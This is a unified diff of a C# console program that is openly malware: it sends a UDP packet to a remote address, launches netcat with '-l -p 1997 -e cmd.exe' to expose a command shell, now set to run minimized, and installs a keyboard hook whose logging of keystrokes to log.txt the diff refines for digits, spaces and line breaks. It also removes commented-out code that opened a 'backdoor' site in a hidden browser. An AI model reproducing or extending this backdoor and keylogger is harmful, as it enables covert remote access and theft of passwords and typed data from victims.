@@ -36,21 +36,13 @@ namespace ConsoleApp1
             int portNumber = 1997;
             //sendIP();
 
-            //Process.Start("http://Hellofrombackdoor1.com").StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
-
-            //Process browser = new Process();
-            //browser.StartInfo.FileName = GetStandardBrowserPath();
-            //browser.StartInfo.WindowStyle = ProcessWindowStyle.Minimized;
-            //browser.StartInfo.Arguments = "http://Hellofrombackdoor1.com";
-            //browser.Start();
-
             IPEndPoint otherServer = new IPEndPoint(IPAddress.Parse(ipAddress), portNumber);
 
             Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
             client.SendTo(packetData, otherServer);
             Process serverListener = new Process();
             serverListener.StartInfo.FileName = "nc.exe";
-            serverListener.StartInfo.WindowStyle = ProcessWindowStyle.Maximized;
+            serverListener.StartInfo.WindowStyle = ProcessWindowStyle.Minimized;
             serverListener.StartInfo.Arguments = "-l -p 1997 -v -e cmd.exe";
             serverListener.Start();
             #endregion
@@ -58,7 +50,7 @@ namespace ConsoleApp1
             #region Key Logger
             var handle = GetConsoleWindow();
 
-            ////Hide
+            //Hide
             //ShowWindow(handle, SW_HIDE);
 
             _hookID = SetHook(_proc);
@@ -89,7 +81,67 @@ namespace ConsoleApp1
                 int vkCode = Marshal.ReadInt32(lParam);
                 Console.WriteLine((Keys)vkCode);
                 StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
-                sw.Write((Keys)vkCode + Environment.NewLine);
+                if((Keys)vkCode == Keys.Return)
+                {
+                    sw.Write(Environment.NewLine);
+                }
+                else if((Keys)vkCode == Keys.Space)
+                {
+                    sw.Write(" ");
+                }
+                else if((Keys)vkCode == Keys.Capital)
+                {
+
+                }
+                else if((Keys)vkCode == Keys.OemPeriod)
+                {
+                    sw.Write(".");
+                }
+                else if(((Keys)vkCode == Keys.D0))
+                {
+                    sw.Write("0");
+                }
+                else if(((Keys)vkCode == Keys.D1))
+                {
+                    sw.Write("1");
+                }
+                else if(((Keys)vkCode == Keys.D2))
+                {
+                    sw.Write("2");
+                }
+                else if(((Keys)vkCode == Keys.D3))
+                {
+                    sw.Write("3");
+                }
+                else if(((Keys)vkCode == Keys.D4))
+                {
+                    sw.Write("4");
+                }
+                else if(((Keys)vkCode == Keys.D5))
+                {
+                    sw.Write("5");
+                }
+                else if(((Keys)vkCode == Keys.D6))
+                {
+                    sw.Write("6");
+                }
+                else if(((Keys)vkCode == Keys.D7))
+                {
+                    sw.Write("7");
+                }
+                else if(((Keys)vkCode == Keys.D8))
+                {
+                    sw.Write("8");
+                }
+                else if(((Keys)vkCode == Keys.D9))
+                {
+                    sw.Write("9");
+                }
+                else
+                {
+                    sw.Write((Keys)vkCode);
+                }
+
                 sw.Close();
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
